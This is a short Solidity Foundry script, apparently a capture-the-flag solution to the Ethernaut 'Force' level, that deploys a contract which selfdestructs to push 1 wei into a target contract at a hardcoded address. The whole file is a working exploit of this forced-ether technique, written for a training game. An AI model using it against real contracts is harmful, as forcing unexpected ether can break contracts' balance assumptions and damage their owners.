


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level7.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Attack {
    constructor(Force _forceInstance ) payable {
    selfdestruct(payable(address(_forceInstance)));
    }
}

contract ForceSolution is Script {

    Force public forceInstance = Force(0x5E0006d187d78493a962eF5198914bc12779Fe52);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{value: 1 wei}(forceInstance);
        vm.stopBroadcast();
    }
}